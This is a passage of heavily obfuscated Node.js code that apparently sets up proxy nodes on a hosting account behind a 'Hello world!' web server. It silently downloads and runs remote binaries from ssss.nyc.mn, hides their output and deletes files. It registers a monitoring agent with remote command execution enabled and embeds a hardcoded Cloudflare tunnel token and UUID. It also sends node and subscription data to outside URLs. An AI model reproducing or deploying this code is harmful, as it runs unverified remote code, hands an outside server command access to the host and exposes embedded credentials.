NEZHA_SERVER&&NEZHA_KEY&&_0x488eab['push'](phpPath);process[_0x210426(0x1ff)]===_0x210426(_0x3551db._0x4ea62a)?exec(_0x210426(0x15d)+_0x488eab[_0x210426(0x1dc)]('\x20')+_0x210426(_0x3551db._0x3af4b8),_0x3585b6=>{const _0xb0177a=_0x210426;console['clear'](),console[_0xb0177a(0x207)](_0xb0177a(_0x12cabb._0x4378ee)),console[_0xb0177a(0x207)](_0xb0177a(_0x12cabb._0x3d9e5c));}):exec(_0x210426(_0x3551db._0x3d65cb)+_0x488eab[_0x210426(0x1dc)]('\x20')+'\x20>/dev/null\x202>&1',_0x5adbb0=>{const _0x114da0=_0x210426;console[_0x114da0(0x1a9)](),console[_0x114da0(0x207)]('App\x20is\x20running'),console[_0x114da0(0x207)](_0x114da0(0x18f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x28acd2={_0x9fe648:0x1b3,_0x1f8715:0x165,_0x914cab:0x199},_0x23424d=_0x5bcb6e;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x23424d(_0x28acd2._0x9fe648));return;}try{const _0x56ffd5=await axios[_0x23424d(0x1f4)](_0x23424d(_0x28acd2._0x1f8715),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x23424d(_0x28acd2._0x914cab)}});return console[_0x23424d(0x207)](_0x23424d(0x19f)),_0x56ffd5;}catch(_0x3b22cc){return console[_0x23424d(0x1b8)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3b22cc[_0x23424d(0x1c1)]),null;}}function _0x3813(){const _0x3e2370=['pkill\x20-f\x20\x22[','countryCode','country_code','App\x20is\x20running','Error\x20downloading\x20files:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','&fp=firefox&type=ws&host=','log','/vmess-argo?ed=2560','child_process','includes','49410aSEpxI','40mAbtpp','/dev/null','2053','firefox','NEZHA_SERVER','php\x20running\x20error:\x20','exec','2096','catch','isFile','mkdirSync','basename','\x0avless://','TunnelSecret','boot.log','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20-c\x20\x22','63906vLmaVl','https://arm64.ssss.nyc.mn/agent','Nodes\x20uploaded\x20successfully','listen','arch','https://arm64.ssss.nyc.mn/bot','false','/api/delete-nodes','\x20>/dev/null\x202>&1\x20&','fileUrl','del\x20/f\x20/q\x20','tls','nezha.minnov.eu.org','vless','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/vmess-argo','/vless-argo','https://amd64.ssss.nyc.mn/v1','https://oooo.serv00.net/add-url','filter','direct','/api/add-nodes','env','config.json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','none','true','1IMrKex','NEZHA_PORT','Error\x20executing\x20command:\x20','readdirSync','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','14293147vfqjXv','335jeJKte','tunnel.yml','win32','clawcloud','https://ipapi.co/json/','trojan','./tmp','NAME','substring','abcdefghijklmnopqrstuvwxyz','UUID','&path=%2Fvless-argo%3Fed%3D2560#','&path=%2Ftrojan-argo%3Fed%3D2560#','?security=tls&sni=','Subscription\x20uploaded\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','8443','\x0a\x20\x20\x20\x20','success','tunnel.json','then','/trojan-argo','web\x20running\x20error:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','e8a37036-883a-4f12-bbe1-83a76fdd737d','1210BVVLxD','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','org','19134ZkHpzQ','match','axios','test','existsSync','data','response','readFileSync','application/json','list.txt','ARGO_DOMAIN','utf-8','send','eyJhIjoiMzcwMmNlNWNlZTUxY2E3ZGM2ZGIwMzkwZjBlM2Y1YmQiLCJ0IjoiMDAyYTMwYmQtMWZjMC00YzE1LWIyZjgtMWQ3ZWI0MmQwMjcwIiwicyI6Ik1qQTRaalEyTlRBdFpUbGxNeTAwTkdFNUxUbGpORFl0WkdOaE9EaG1ZVGcxTjJNMiJ9','automatic\x20access\x20task\x20added\x20successfully','base64','UPLOAD_URL','writeFileSync','map','charAt','forEach','Unhandled\x20error\x20in\x20startserver:','util','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','clear','Empowerment\x20failed\x20for\x20','text/plain;\x20charset=utf-8','Q8LpO6biHtt18jxj9y','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','.exe\x20>\x20nul\x202>&1','stream','CFIP','sub.txt','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Skipping\x20adding\x20automatic\x20access\x20task','127.0.0.1','ARGO_DOMAIN:','ARGO_AUTH','\x20failed:\x20','error','Empowerment\x20success\x20for\x20','split','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','http://ip-api.com/json/','has','https://arm64.ssss.nyc.mn/v1','Download\x20','PROJECT_URL','message','SUB_PATH','stringify','\x22\x20>\x20/dev/null\x202>&1','http','2087','\x20is\x20running','taskkill\x20/f\x20/im\x20','set','arm','Hello\x20world!','\x20-s\x20','createWriteStream','\x20already\x20exists','ARGO_PORT','CFPORT','length','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','rm\x20-rf\x20','arm64','443','unlinkSync','chmod','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','ArgoDomain:','\x20-p\x20','\x20>\x20nul\x202>&1','join','npm\x20running\x20error:\x20','\x0aclient_secret:\x20','611866lXssMF','freedom','unshift','config.yaml','all','random','\x20successfully','cfa.okai.us.to','aarch64','nohup\x20','356380fHmrZJ','\x0a\x20\x20tunnel:\x20','toString','get','/config.json\x20>/dev/null\x202>&1\x20&','tcp','push','status','Error\x20in\x20startserver:','1611799jXHuii','https://amd64.ssss.nyc.mn/agent','post','pipe','block','/tunnel.yml\x20run','\x0a\x0avmess://','https://arm64.ssss.nyc.mn/web','\x20is\x20created','NEZHA_KEY','?encryption=none&security=tls&sni=','Content-Type','from','platform'];_0x3813=function(){return _0x3e2370;};return _0x3813();}async function startserver(){const _0x555b16={_0x564a23:0x1f1},_0x189345=_0x5bcb6e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x462e97){console['error'](_0x189345(_0x555b16._0x564a23),_0x462e97);}}startserver()[_0x5bcb6e(0x14a)](_0x5ed843=>{const _0x5d9c64={_0x398e24:0x1a6},_0x37bb46=_0x5bcb6e;console['error'](_0x37bb46(_0x5d9c64._0x398e24),_0x5ed843);}),app[_0x5bcb6e(0x156)](PORT,()=>console[_0x5bcb6e(0x207)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
